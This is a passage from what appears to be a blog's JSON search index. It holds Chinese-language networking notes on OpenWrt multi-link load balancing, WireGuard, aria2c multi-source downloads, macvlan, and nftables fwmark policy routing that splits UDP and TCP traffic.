<pre><code>url_path=/d/Guest/Aria2/SW_DVD9_Win_Pro_11_22H2.6_64BIT_ChnSimp_Pro_Ent_EDU_N_MLF_X23-39378.ISO?sign=x20IQ5x4wziM_s4fsPLl9qt3943XgQ_CkfaFrpJxoVA=:0\n\naria2c -c -x 1 -s 3 http://thinkpad10.lan$url_path http://192.168.35.3:5244$url_path http://192.168.35.2:5244$url_path\n</code></pre></p> <p>\u603b\u7ed3\u6765\u8bf4\u5c31\u662f</p> <ul> <li>\u5355\u4e2a\u8282\u70b9\uff0c\u6709\u591a\u5c11\u6761\u4e0a\u6e38\u94fe\u8def\u5c31\u9700\u8981\u591a\u5c11\u5730\u5740\uff08\u57fa\u4e8e wireguard \u53ef\u4ee5\u4f7f\u7528 LAN \u5730\u5740\uff0c\u4f46\u662f\u8fde\u63a5 wg \u4ecd\u7136\u9700\u8981\u4e24\u4e2a\u516c\u7f51\u5730\u5740\u8fdb\u884c\u5206\u6d41\uff09</li> <li>\u4e0d\u540c\u8282\u70b9\u95f4\u7531\u4e8e\u4f7f\u7528 nginx \u53cd\u4ee3\uff0c\u56e0\u6b64\u4e92\u4e0d\u5f71\u54cd\uff0c\u53ef\u4ee5\u4f7f\u7528\u76f8\u540c\u7684\u516c\u7f51\u5730\u5740\u3002</li> <li>\u4e3e\u4f8b\u6765\u8bf4\uff0cB \u6709\u4e24\u6761\u94fe\u8def\uff0c\u56e0\u6b64\u6211\u7684\u6587\u4ef6\u670d\u52a1\u5668\u5c31\u9700\u8981\u6700\u5c11\u4e24\u4e2a\u516c\u7f51\u5730\u5740\uff08\u6211\u7684\u670d\u52a1\u5668\u53ea\u6709\u4e00\u4e2a\u516c\u7f51\u5730\u5740\uff0c\u4f46\u662f\u597d\u5728\u6211\u51fa\u79df\u5c4b\u8fd8\u6709\u4e00\u6761\u5bbd\u5e26\uff0c\u53ef\u4ee5\u63d0\u4f9b\u4e00\u4e2a\u516c\u7f51\u5730\u5740\uff0c\u800c\u51fa\u79df\u5c4b\u901a\u8fc7 wg \u8fde\u63a5\u5230\u6211\u7684\u670d\u52a1\u5668\u7f51\u7edc\u5373\u53ef\uff09</li> <li>A \u63d0\u4f9b\u4e00\u6761\u94fe\u8def\uff08\u53e6\u4e00\u6761\u8fde\u63a5\u8def\u7531\u5668\u4e0d\u7b97\uff09\uff0c\u9700\u8981\u4e00\u4e2a\u5730\u5740\uff08wg + LAN \u5730\u5740\u5373\u53ef\uff09</li> <li>\u8def\u7531\u5668\u6709\u4e00\u6761\u94fe\u8def\uff0c\u9700\u8981\u4e00\u4e2a\u5730\u5740\uff08\u540c\u6837\u662f wg + LAN \u5730\u5740\uff09\u3002\u7531\u4e8e\u8def\u7531\u5668\u65e0\u6cd5\u8bbe\u7f6e\u53cd\u4ee3\uff0c\u56e0\u6b64\u4e0d\u80fd\u548c\u975e nginx \u8282\u70b9\uff08\u6bd4\u5982\u4e0b\u8f7d\u8282\u70b9\uff09\u4f7f\u7528\u7684\u5730\u5740\u51b2\u7a81\uff0c\u5426\u5219\u6700\u540e\u7684 aria2c \u547d\u4ee4\u4e2d\u5c31\u4f1a\u6709\u91cd\u590d\u7684 URI\u3002</li> </ul>","tags":["ECMP","wireguard","aria2c","nginx","CDN","macvlan","iw","\u8d1f\u8f7d\u5747\u8861"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/16/L3%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%AE%9E%E7%8E%B0%E7%BD%91%E9%80%9F%E5%8F%A0%E5%8A%A0/#\u9047\u5230\u7684\u5751","title":"\u9047\u5230\u7684\u5751","text":"<ul> <li>windows wg \u63a5\u53e3\u91cd\u65b0\u8fde\u63a5\u540e\uff0c\u9700\u8981\u91cd\u65b0\u5f00\u542f\u8f6c\u53d1 <pre><code># Powershell(admin) \u4e2d\u6267\u884c\nSet-NetIPInterface -Forwarding Enabled\n</code></pre></li> </ul> <p>aria2c \u6307\u5b9a\u591a\u4e2a -s \u65f6\uff0c\u5982\u679c\u662f\u76f8\u540c host \u4e0d\u540c\u7aef\u53e3\uff0c\u90a3\u4e48\u9700\u8981\u628a -x \u8bbe\u7f6e\u4e3a URI \u6570\u91cf\uff0c\u5426\u5219\u53ea\u4f1a\u5efa\u7acb\u4e00\u4e2a\u8fde\u63a5\u3002</p>","tags":["ECMP","wireguard","aria2c","nginx","CDN","macvlan","iw","\u8d1f\u8f7d\u5747\u8861"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/16/L3%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%AE%9E%E7%8E%B0%E7%BD%91%E9%80%9F%E5%8F%A0%E5%8A%A0/#\u53c2\u8003\u8d44\u6599","title":"\u53c2\u8003\u8d44\u6599","text":"<p>[\u8bd1] \u73b0\u4ee3\u7f51\u7edc\u8d1f\u8f7d\u5747\u8861\u4e0e\u4ee3\u7406\u5bfc\u8bba\uff082017\uff09 (arthurchiao.art)</p>","tags":["ECMP","wireguard","aria2c","nginx","CDN","macvlan","iw","\u8d1f\u8f7d\u5747\u8861"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/16/L3%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%AE%9E%E7%8E%B0%E7%BD%91%E9%80%9F%E5%8F%A0%E5%8A%A0/#\u5355\u7f51\u5361\u5f00\u591a\u4e2a\u865a\u62df\u65e0\u7ebf\u63a5\u53e3","title":"\u5355\u7f51\u5361\u5f00\u591a\u4e2a\u865a\u62df\u65e0\u7ebf\u63a5\u53e3","text":"<p>Q: openwrt wlan0 \u5982\u4f55\u591a\u6b21\u8fde\u63a5\u540c\u4e00\u4e2a SSID\uff0c\u5e76\u83b7\u5f97\u591a\u4e2a ip \u5730\u5740 chatgpt:</p> <p>\u5728 OpenWrt \u4e0a\uff0c\u60f3\u8981\u8ba9\u540c\u4e00\u4e2a Wi-Fi \u7f51\u5361\uff08<code>wlan0</code>\uff09\u591a\u6b21\u8fde\u63a5\u5230\u540c\u4e00\u4e2a SSID\uff0c\u5e76\u83b7\u53d6\u591a\u4e2a IP \u5730\u5740\uff0c\u901a\u5e38\u53ef\u4ee5\u901a\u8fc7\u521b\u5efa\u591a\u4e2a\u865a\u62df\u65e0\u7ebf\u63a5\u53e3\uff08VIF\uff0cVirtual Interfaces\uff09\u6765\u5b9e\u73b0\u3002\u901a\u8fc7\u7ed9\u6bcf\u4e2a\u865a\u62df\u63a5\u53e3\u5206\u914d\u4e0d\u540c\u7684 MAC \u5730\u5740\uff0c\u5b83\u4eec\u53ef\u4ee5\u5206\u522b\u4ece\u8def\u7531\u5668\u83b7\u53d6\u4e0d\u540c\u7684 IP \u5730\u5740</p> <pre><code>iw list | grep -A 10 \"interface combinations\"\n</code></pre> <p>mi4a <pre><code>valid interface combinations:\n                 * #{ IBSS } &lt;= 1, #{ managed, AP, mesh point, P2P-client, P2P-GO } &lt;= 8,\n                   total &lt;= 8, #channels &lt;= 1, STA/AP BI must match, radar detect widths: { 20 MHz (no HT), 20 MHz, 40 MHz, 80 MHz }\n\n        HT Capability overrides:\n                 * MCS: ff ff ff ff ff ff ff ff ff ff\n                 * maximum A-MSDU length\n                 * supported channel width\n                 * short GI for 40 MHz\n                 * max A-MPDU length exponent\n                 * min MPDU start spacing\n--\n        valid interface combinations:\n                 * #{ IBSS } &lt;= 1, #{ managed, AP, mesh point, P2P-client, P2P-GO } &lt;= 4,\n                   total &lt;= 4, #channels &lt;= 1, STA/AP BI must match\n        HT Capability overrides:\n                 * MCS: ff ff ff ff ff ff ff ff ff ff\n                 * maximum A-MSDU length\n                 * supported channel width\n                 * short GI for 40 MHz\n                 * max A-MPDU length exponent\n                 * min MPDU start spacing\n        max # scan plans: \n</code></pre></p> <ul> <li>#{ IBSS } &lt;= 1: \u8868\u793a\u7f51\u5361\u6700\u591a\u652f\u6301\u4e00\u4e2a IBSS\uff08Independent Basic Service Set\uff0c\u72ec\u7acb\u57fa\u672c\u670d\u52a1\u96c6\uff0c\u5373\u81ea\u7ec4\u7ec7\u7f51\u7edc\uff0c\u4e5f\u79f0\u4e3a Ad-Hoc \u6a21\u5f0f\uff09\u3002</li> <li>#{ managed, AP, mesh point, P2P-client, P2P-GO } &lt;= 8: \u8868\u793a\u5728 managed\uff08STA\uff0c\u5ba2\u6237\u7aef\u6a21\u5f0f\uff09\u3001AP\uff08\u63a5\u5165\u70b9\u6a21\u5f0f\uff09\u3001mesh point\uff08\u7f51\u72b6\u7f51\u7edc\u6a21\u5f0f\uff09\u3001P2P-client\uff08Wi-Fi Direct \u5ba2\u6237\u7aef\uff09\u3001P2P-GO\uff08Wi-Fi Direct \u7ec4\u6240\u6709\u8005\uff09\u8fd9\u51e0\u79cd\u6a21\u5f0f\u4e2d\uff0c\u603b\u5171\u53ef\u4ee5\u6709\u6700\u591a 8 \u4e2a\u63a5\u53e3\u8fd0\u884c\u3002</li> <li>total &lt;= 8: \u8fd9\u662f\u603b\u63a5\u53e3\u6570\u91cf\u7684\u9650\u5236\uff0c\u8868\u793a\u53ef\u4ee5\u540c\u65f6\u8fd0\u884c\u6700\u591a 8 \u4e2a\u63a5\u53e3\uff08\u5305\u62ec\u6240\u6709\u7c7b\u578b\u7684\u63a5\u53e3\uff09\u3002</li> <li>#channels &lt;= 1: \u8fd9\u662f\u4fe1\u9053\u9650\u5236\uff0c\u8868\u793a\u7f51\u5361\u53ea\u80fd\u5728\u4e00\u4e2a\u4fe1\u9053\u4e0a\u5de5\u4f5c\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5373\u4f7f\u4f60\u521b\u5efa\u4e86\u591a\u4e2a\u63a5\u53e3\uff0c\u5b83\u4eec\u4e5f\u5fc5\u987b\u5728\u540c\u4e00\u4e2a Wi-Fi \u4fe1\u9053\u4e0a\u5de5\u4f5c\uff08\u4e0d\u80fd\u540c\u65f6\u4f7f\u7528\u4e0d\u540c\u9891\u6bb5\uff0c\u4f8b\u5982 2.4GHz \u548c 5GHz\uff09\u3002</li> <li>STA/AP BI must match: \u8fd9\u610f\u5473\u7740 Station\uff08\u5ba2\u6237\u7aef\uff09\u548c AP\uff08\u63a5\u5165\u70b9\uff09\u6a21\u5f0f\u7684\u4fe1\u6807\u95f4\u9694\uff08Beacon Interval\uff09\u5fc5\u987b\u5339\u914d\u3002</li> <li>radar detect widths: { 20 MHz (no HT), 20 MHz, 40 MHz, 80 MHz }: \u8fd9\u8868\u793a\u7f51\u5361\u652f\u6301\u5728\u96f7\u8fbe\u68c0\u6d4b\u7684\u60c5\u51b5\u4e0b\u8fd0\u884c\u7684\u9891\u5bbd\u8303\u56f4\uff0c\u901a\u5e38\u4e0e DFS\uff08\u52a8\u6001\u9891\u7387\u9009\u62e9\uff09\u76f8\u5173\u3002\u8fd9\u91cc\u7f51\u5361\u652f\u6301 20MHz \u5230 80MHz \u7684\u9891\u5bbd\u3002</li> </ul> <p>\u5b9e\u9a8c\u53ef\u4ee5\u521b\u5efa\u591a\u4e2a client\uff0c\u4f46\u662f\u53ea\u6709\u4e00\u4e2a\u53ef\u4ee5\u8fde\u63a5\u30022.4G \u82af\u7247\u53ef\u4ee5\u5f00 4 \u4e2a\uff0c\u72b6\u6001\u90fd\u662f enable\uff0c\u4f46\u662f\u540c\u65f6\u53ea\u6709\u4e00\u4e2a interface \u53ef\u4ee5 dhcp \u83b7\u5f97\u5730\u5740\u30025G \u82af\u7247\uff0c\u53ea\u6709\u4e00\u4e2a\u663e\u793a\u4e3a enable \u72b6\u6001\u3002\u4e0d\u77e5\u9053\u662f\u56e0\u4e3a\u786c\u4ef6\u7684\u95ee\u9898\uff0c\u603b\u4e4b\u4e0d\u80fd\u591a\u5f00</p> <p></p> <p>\u4e3a\u4ec0\u4e48\u8981\u4e0d\u540c SSID \u5462\uff1f</p> <p>In theory, if there were multiple different SSIDs (different names), it would be possible to connect to more than one concurrently, Mixing multiple 'ap' and 'sta' interfaces on the same hardware radio - Installing and Using OpenWrt - OpenWrt Forum</p> <p>Can a WiFi station be connected to more than one SSID at once? : r/networking (reddit.com)</p>","tags":["ECMP","wireguard","aria2c","nginx","CDN","macvlan","iw","\u8d1f\u8f7d\u5747\u8861"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/16/L3%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%AE%9E%E7%8E%B0%E7%BD%91%E9%80%9F%E5%8F%A0%E5%8A%A0/#\u53e6\u4e00\u4e2a\u601d\u8defbridge-wifi-client","title":"\u53e6\u4e00\u4e2a\u601d\u8def\uff1abridge wifi client","text":"<p>\u5982\u679c\u80fd\u4ece wlan1 \u63a5\u53e3\u53d1\u9001\u591a\u4e2a dhcp request \u83b7\u5f97\u591a\u4e2a ip \u597d\u50cf\u4e5f\u884c\uff1f\u8fd9\u9700\u8981\u6211\u521b\u5efa\u591a\u4e2a\u865a\u62df\u63a5\u53e3\uff0c\u7136\u540e\u548c wifi \u63a5\u53e3 bridge \u8d77\u6765\u3002</p> <p>\u7136\u800c\u770b\u5230 bridge wifi \u597d\u50cf\u662f\u4e0d\u53ef\u884c\u7684\uff1f\u4ed4\u7ec6\u4e00\u60f3\u8fd9\u91cc\u7684 bridge \u5c82\u4e0d\u662f\u548c mesh \u6709\u70b9\u50cf\u4e86\u3002\u90a3\u4e48\u53c2\u8003 mesh \u8bbe\u7f6e\uff0c\u53ef\u80fd\u9700\u8981\u5bf9\u65b9\u7684\u8def\u7531\u5668\u4e5f\u652f\u6301\u4f60\u624d\u80fd bridge\u3002 Connect to WiFi, Bridge to Ethernet (DHCP) - MikroTik</p> <p>In general attempting to bridge wifi clients doesn't work. If the AP is a mikrotik running 6.xx versions, it has features that do work well with mikrotik clients, just choose station bridge on the maplite, and add it to the bridge. (choose ap bridge on the mikrotik AP) Otherwise, you can try setting the maplite wifi client to be a station pseudo bridge. That sort of works, sometimes. Unless you really need it bridged, you are probably better off just making the wifi interface a wan interface, and letting the devices behind it get an ip address from the maplite's local dhcp server and get to the main network via Nat.</p> <p>\u8fd9\u624d\u610f\u8bc6\u5230\u4ee5\u524d\u7684 bridge wifi \u548c lan \u662f\u56e0\u4e3a wifi \u5de5\u4f5c\u5728 AP \u6a21\u5f0f\uff0c\u6240\u4ee5\u624d\u80fd\u548c lan bridge \u5728\u4e00\u8d77\u3002 [OpenWrt Wiki] Wi-Fi Extender/Repeater with Bridged AP over Ethernet </p> <p>\u627e\u5230\u4e86\u4e0d\u80fd bridge \u7684\u4f50\u8bc1\uff0c\u4e5f\u63d0\u5230\u4e86\u786e\u5b9e\u53ef\u4ee5 AP + STA\u3002[OpenWrt-Devel] Multiple Wi-Fi client/AP interfaces on one radio (was: Change OpenWrt Wifi default settings) (infradead.org)</p> <p>Also note that, if you want to bridge a STA interface onto anything else, it'll need to be in \"WDS\" mode and the the AP to which it's connecting will also need to be in \"WDS\" mode (note the \"option wds '1'\", in my example above), because the standard \"3-address mode\" of Wi-Fi isn't bridgeable (and note that WDS \"4-address mode\" is bridgeable, but not standardised across different platforms--so you're probably OK so long as all of your equipment is running Linux and using the same Wi-Fi driver, but don't expect to bridge a STA interface that's connected non-Linux Wi-Fi router).</p>","tags":["ECMP","wireguard","aria2c","nginx","CDN","macvlan","iw","\u8d1f\u8f7d\u5747\u8861"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/16/L3%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%AE%9E%E7%8E%B0%E7%BD%91%E9%80%9F%E5%8F%A0%E5%8A%A0/#macvlan","title":"macvlan","text":"<p>\u8fd8\u662f\u5728\u90a3\u7bc7 ECMP \u8d1f\u8f7d\u5747\u8861\u7684\u6587\u7ae0<sup>2</sup>\u91cc\u770b\u5230\u4e86 macvlan \u7684\u7528\u6cd5\uff0c\u597d\u50cf\u53ef\u4ee5\u5b9e\u73b0\u4e00\u4e2a\u7f51\u5361\u865a\u62df\u51fa\u591a\u4e2a mac \u5730\u5740\uff0c\u7136\u540e\u83b7\u5f97\u591a\u4e2a\u5730\u5740\u3002</p> <p>\u8def\u7531\u5668\u4e0a\u7684RJ45\u7f51\u53e3\u662f\u7ed1\u5b9a\u5230VLAN\u4e0a\u7684\uff0c\u5982\u679c\u662f\u6dfb\u52a0\u865a\u62df\u7f51\u5361\u5230\u4e00\u4e2aVLAN\u4e0a\u5c31\u662f\u5355\u7ebf\u591a\u62e8\uff0c\u6dfb\u52a0\u5230\u591a\u4e2aVLAN\u4e0a\u5c31\u53ef\u4ee5\u505a\u591a\u7ebf\u591a\u62e8\u4e86 \u8fd9\u91cc\u7684<code>eth0.2</code>\u5bf9\u5e94\u4e8eWAN\u53e3\uff08\u5728<code>Interface -&gt; Switch</code>\u53ef\u4ee5\u770b\u5230WAN\u7ed1\u5b9a\u5728VLAN 2\u4e0a\uff09\uff0c\u4e0d\u540c\u7684\u8bbe\u5907\u53ef\u80fd\u6709\u4e9b\u8bb8\u4e0d\u540c\uff0c\u8fd9\u91cc\u5728<code>eth0.2</code>\u4e0a\u6dfb\u52a0\u4e24\u4e2a\u865a\u62df\u7f51\u5361 </p> <pre><code>for i in `seq 1 2`\ndo\n  ip link add link eth0.2 name veth$i type macvlan\ndone\n</code></pre> <p>\u4f46\u662f\u6211\u6d4b\u8bd5\u5728 wlan1_0 \u4e0a\u521b\u5efa\u591a\u4e2a veth \u540e\uff0c\u786e\u5b9e\u80fd\u5728 wlan1_0 \u4e0a\u6293\u5230\u4e0d\u540c mac \u7684 DHCP \u8bf7\u6c42\uff0c\u4f46\u662f\u5374\u83b7\u5f97\u4e0d\u4e86 ip \u5730\u5740\u3002</p>","tags":["ECMP","wireguard","aria2c","nginx","CDN","macvlan","iw","\u8d1f\u8f7d\u5747\u8861"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/16/L3%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%AE%9E%E7%8E%B0%E7%BD%91%E9%80%9F%E5%8F%A0%E5%8A%A0/#\u5982\u4f55\u8ba9-udp-\u548c-tcp-\u8d70\u4e0d\u540c\u8def\u7531","title":"\u5982\u4f55\u8ba9 udp \u548c tcp \u8d70\u4e0d\u540c\u8def\u7531","text":"<p>\u8def\u7531\u5668\u901a\u8fc7 udp wg \u5230\u6211\u7684\u516c\u7f51\u673a\u5668\u4e0a\u7f51\u3002\u8fd9\u5bfc\u81f4\u6211\u7684\u516c\u7f51 ip \u9700\u8981\u8d70 wifi \u8def\u7531\uff0c\u800c\u8be5 wifi \u4e0d\u767b\u9646\u53ea\u6709 UDP \u80fd\u901a\u3002\u56e0\u6b64\u5230\u6211\u516c\u7f51 ip \u7684 TCP \u6d41\u91cf\u5c31\u65e0\u6cd5\u8fde\u63a5\u4e86\u3002\u6709\u6ca1\u6709\u529e\u6cd5\u8ba9 UDP \u6d41\u91cf\u8d70 wifi\uff0c\u800c tcp \u6d41\u91cf\u8d70 wg \u5efa\u7acb\u540e\u7684\u8def\u7531\u5462\uff1f</p> <p>\u7b54\u6848\u662f\u901a\u8fc7 nftable \u7ed9 UDP \u6d41\u91cf\u8bbe\u7f6e fwmark\uff0c\u7136\u540e\u4f7f\u7528\u7b56\u7565\u8def\u7531\u5bf9 UDP \u6d41\u91cf\u8fdb\u884c\u5206\u6d41\u3002</p> <p>UDPATE\uff1a\u6709\u66f4\u7b80\u5355\u65b9\u6848\uff0cip route \u652f\u6301\u6839\u636e ipproto \u5206\u6d41\uff0c\u4e00\u884c\u547d\u4ee4\u5c31\u53ef\u4ee5\u5b9e\u73b0\u9488\u5bf9 UDP \u548c TCP \u7684\u7b56\u7565\u8def\u7531\u3002\u4e0d\u8fc7\u76ee\u524d openwrt luci \u4e0d\u652f\u6301\u914d\u7f6e\uff08\u5e95\u5c42\u7684 uci \u4e0d\u652f\u6301\uff09\u3002\u7ed9\u63d0\u4e86\u4e00\u4e2a issue\uff1aMissing ipproto keyword in network config rule section \u00b7 Issue #7330 \u00b7 openwrt/luci <pre><code>ip ru add from all ipproto udp table udp_table prior 10\n</code></pre></p>","tags":["ECMP","wireguard","aria2c","nginx","CDN","macvlan","iw","\u8d1f\u8f7d\u5747\u8861"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/16/L3%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%AE%9E%E7%8E%B0%E7%BD%91%E9%80%9F%E5%8F%A0%E5%8A%A0/#\u8bbe\u7f6e\u7b56\u7565\u8def\u7531","title":"\u8bbe\u7f6e\u7b56\u7565\u8def\u7531","text":"<p>UDP \u6d41\u91cf\u4f7f\u7528 fwmark 2 \u8fdb\u884c\u8def\u7531\u8868\u7684\u9009\u62e9\uff08\u4e4b\u540e\u4f7f\u7528 nft \u7ed9 udp \u5305\u6253\u4e0a mark\uff09 <pre><code># \u521b\u5efa\u989d\u5916\u7684\u8def\u7531\u8868\necho \"1000 udp_table\" &gt;&gt; /etc/iproute2/rt_tables\n\n# \u5c06 UDP \u6d41\u91cf\u5b9a\u5411\u5230 udp_table \nip rule add fwmark 2 lookup udp_table prior 10\n\n# \u4e3a UDP \u6d41\u91cf\u914d\u7f6e\u7279\u5b9a\u8def\u7531 \nip route add 114.214.236.72 via 10.3.100.1 dev wlan1_0 table udp_table\n</code></pre></p>","tags":["ECMP","wireguard","aria2c","nginx","CDN","macvlan","iw","\u8d1f\u8f7d\u5747\u8861"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/16/L3%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%AE%9E%E7%8E%B0%E7%BD%91%E9%80%9F%E5%8F%A0%E5%8A%A0/#nft-\u8bbe\u7f6e-mark","title":"nft \u8bbe\u7f6e mark","text":"<p>p.s \u521a\u5f00\u59cb\u65e0\u8bba\u4f7f\u7528 chatgpt \u8fd8\u662f google \u641c\u7d22\uff0c\u90fd\u662f\u63d0\u793a\u5728 prerouting chain \u6dfb\u52a0\u89c4\u5219\u3002\u7136\u800c\u6211\u4eec\u8fd9\u91cc\u662f\u60f3\u8981\u8ba9 router \u81ea\u8eab\u8fde\u63a5 wg \u65f6\uff0c\u8d70\u7279\u5b9a\u7684\u8def\u7531\uff0c\u56e0\u6b64\u5e94\u8be5\u5728 output chain \u4e2d\u6dfb\u52a0\u89c4\u5219\u3002\u6253\u4e0a mark \u540e\uff0c\u4f1a\u89e6\u53d1 rerouting<sup>6</sup></p> <p>\u4f7f\u7528 nft \u6253\u6807\u8bb0 <pre><code>nft add table ip mangle\nnft add chain ip mangle output \\{ type route hook output priority -150 \\; \\}\nnft add rule ip mangle output ip daddr 114.214.236.72 udp dport 51820 counter mark set 2\n\nnft -a list table ip mangle\nnft delete rule ip mangle prerouting handle 7\n</code></pre></p> <p>\u4f7f\u7528 openwrt \u914d\u7f6e\u6587\u4ef6\u65b9\u5f0f\uff0c\u53ef\u4ee5\u6301\u4e45\u5316 <pre><code>vim /etc/config/firewall\n\nconfig include\n        option enabled  1\n        option type  'script'\n        option path  '/etc/firewall.user'\n        option fw4_compatible 1\n</code></pre></p> <pre><code>~/ vim /etc/firewall.user\nnft add table ip mangle\nnft add chain ip mangle output \\{ type route hook output priority -150 \\; \\}\nnft add rule ip mangle output udp dport 51820 counter mark set 2\n</code></pre>","tags":["ECMP","wireguard","aria2c","nginx","CDN","macvlan","iw","\u8d1f\u8f7d\u5747\u8861"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/16/L3%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%AE%9E%E7%8E%B0%E7%BD%91%E9%80%9F%E5%8F%A0%E5%8A%A0/#conntrak-\u9a8c\u8bc1\u7ed3\u679c","title":"conntrak \u9a8c\u8bc1\u7ed3\u679c","text":"<pre><code>opkg install conntrack \n</code></pre> <p>\u8d70 wlan1_0 (guest wiif)</p> <ul> <li>contrack \u8f93\u51fa\u4e2d\uff0c17 \u8868\u793a\u662f udp \u534f\u8bae\uff0ctcp \u662f 6</li> <li>\u540e\u9762\u7684\u6570\u5b57\u662f\u8d85\u65f6\u65f6\u95f4\uff0c\u9ed8\u8ba4 3 \u5206\u949f\u4e0d active \u5c31\u4f1a\u65ad\u5f00\u8fde\u63a5 <pre><code>~/ conntrack -L -d 114.214.236.72\nudp      17 171 src=10.3.103.238 dst=114.214.236.72 sport=51820 dport=51820 packets=150 bytes=22092 src=114.214.236.72 dst=10.3.103.238 sport=51820 dport=51820 packets=149 bytes=33352 [ASSURED] mark=0 use=1\n</code></pre></li> </ul> <p>\u8d70 wlan0_3 (Hotspot) <pre><code>udp      17 172 src=192.168.137.238 dst=114.214.236.72 sport=51820 dport=51820 packets=6 bytes=712 src=114.214.236.72 dst=192.168.137.238 sport=51820 dport=51820 packets=6 bytes=808 [ASSURED] mark=0 use=1\n</code></pre></p> <p>udp \u5206\u6d41\u6210\u529f</p> <ul> <li>\u53ef\u4ee5\u770b\u5230\u7279\u522b\u7684\u662f src \u662f 192.168.137.238\uff0c\u56de\u5305\u7684 dst \u5374\u53d8\u6210\u4e86 10.3.103.238 <pre><code>~/ conntrack -L -d 114.214.236.72\nicmp     1 29 src=192.168.137.238 dst=114.214.236.72 type=8 code=0 id=8998 packets=29 bytes=2436 src=114.214.236.72 dst=192.168.137.238 type=0 code=0 id=8998 packets=26 bytes=2184 mark=0 use=1\nudp      17 179 src=192.168.137.238 dst=114.214.236.72 sport=51820 dport=51820 packets=109 bytes=16288 src=114.214.236.72 dst=10.3.103.238 sport=51820 dport=41685 packets=106 bytes=16228 [ASSURED] mark=0 use=2\n</code></pre></li> </ul>","tags":["ECMP","wireguard","aria2c","nginx","CDN","macvlan","iw","\u8d1f\u8f7d\u5747\u8861"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/16/L3%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%AE%9E%E7%8E%B0%E7%BD%91%E9%80%9F%E5%8F%A0%E5%8A%A0/#\u53c2\u8003\u8d44\u6599_1","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>iptables - Routing fwmark to VPN gateway using nftables mark - Server Fault</li> <li>Setting packet metainformation - nftables wiki</li> <li>fwmark \u9488\u5bf9\u5355\u4e2a packet\uff0cct mark \u9488\u5bf9 conntack \u8fde\u63a5\uff1a\u5728 OpenWrt \u4e0b\u914d\u7f6e\u300c\u6e90\u8fdb\u6e90\u51fa\u300d\u7684\u7b56\u7565\u8def\u7531(\u4f7f\u7528 nftables) \u2013 iEdon</li> </ul> <ol> <li> <p>networking - Choosing gateway based on Source IP in Windows - Server Fault \u21a9</p> </li> <li> <p>\u8def\u7531\u8d1f\u8f7d\u5747\u8861\uff1aECMP - TimeForget (lwz322.github.io) \u21a9\u21a9\u21a9</p> </li> <li> <p>Jakub Sitnicki's blog (codecave.cc) \u21a9\u21a9</p> </li> <li> <p>Jakub Sitnicki's blog (codecave.cc) \u21a9\u21a9</p> </li> <li> <p>kernel.org/doc/Documentation/networking/ip-sysctl.txt \u21a9</p> </li> <li> <p>nf-packet-flow.png (2412\u00d7790) (inai.de) \u21a9</p> </li> </ol>","tags":["ECMP","wireguard","aria2c","nginx","CDN","macvlan","iw","\u8d1f\u8f7d\u5747\u8861"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/03/15/MTU%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%28%E4%BA%8C%E5%B1%82%E9%9A%A7%E9%81%93%E7%BB%84%E7%BD%91%29/","title":"MTU \u7684\u90a3\u4e9b\u5751(\u4e8c\u5c42\u96a7\u9053\u7ec4\u7f51)","text":"","tags":["MTU","PMTUD","MSS","fragment","GRE"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/03/15/MTU%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%28%E4%BA%8C%E5%B1%82%E9%9A%A7%E9%81%93%E7%BB%84%E7%BD%91%29/#\u80cc\u666f","title":"\u80cc\u666f","text":"<p>\u80cc\u666f\uff1a\u4e32\u6d41\u8f6f\u4ef6\u4e0d\u652f\u6301\u624b\u52a8\u6dfb\u52a0 ip\uff0c\u5bfc\u81f4\u9700\u8981\u4e8c\u5c42\u96a7\u9053\u8fde\u63a5\u4e24\u4e2a\u8def\u7531\u5668\u3002</p> <p>\u901a\u8fc7 mDNS proxy \u5b9e\u73b0\u672c\u5730\u53d1\u73b0</p> <p>\u4e4b\u524d\u8fd8\u7814\u7a76\u8fc7\u8fd9\u7c7b\u8f6f\u4ef6\u4e00\u822c\u662f\u600e\u4e48\u53d1\u73b0server\u7684\u3002\u53d1\u73b0\u786e\u5b9e\u6709\u4e00\u4e9b\u65b9\u6cd5\u53ef\u4ee5\u5b9e\u73b0\u8de8\u7f51\u7edc\u7684\u53d1\u73b0\u3002\u6bd4\u5982\u5e38\u89c1\u7684\u201c\u53d1\u73b0\u201d\u534f\u8bae\uff08\u4e0d\u77e5\u9053\u672f\u8bed\u662f\u4ec0\u4e48\uff09\u6709mDNS\u548cupnp\u3002\u662f\u901a\u8fc7ipv4 